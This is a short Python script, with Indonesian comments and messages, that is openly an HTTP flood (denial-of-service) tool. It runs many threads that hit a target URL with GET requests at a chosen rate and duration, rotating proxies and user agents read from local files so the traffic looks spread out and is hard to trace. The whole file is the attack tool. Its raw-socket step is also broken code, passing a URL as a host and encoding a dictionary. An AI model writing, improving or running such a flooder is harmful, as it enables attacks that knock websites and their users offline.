import requests
import threading
import time
import random
import sys
import socket

def attack(url, duration, rps, thread):
    proxies = []
    with open("proxstars.txt", "r") as f:
        proxies = f.read().splitlines()
    user_agents = []
    with open("uastaro.txt", "r") as f:
        user_agents = f.read().splitlines()
    threads = []
    for _ in range(thread):
        t = threading.Thread(target=attack_thread, args=(url, duration, rps, proxies, user_agents))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def attack_thread(url, duration, rps, proxies, user_agents):
    delay = 1 / rps
    start_time = time.time()
    while time.time() < start_time + duration:
        proxy = random.choice(proxies)
        user_agent = random.choice(user_agents)
        try:
            headers = {
                "User-Agent": user_agent,
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": url,
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Cookie": "overpower=true"
            }
            session = requests.Session()
            session.headers.update(headers)
            session.get(url, proxies={"http": proxy}, timeout=5)
            
            # Mengirim HTTP GET Request melalui socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((url, 80))
                s.sendall(headers.encode())
                s.close()
        except Exception as e:
            print(f"Terjadi kesalahan: {e}")
        time.sleep(delay)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Penggunaan: python script.py <url> <duration> <rps> <thread>")
        sys.exit(1)
    url = sys.argv[1]
    duration = int(sys.argv[2])
    rps = int(sys.argv[3])
    thread = int(sys.argv[4])
    attack(url, duration, rps, thread)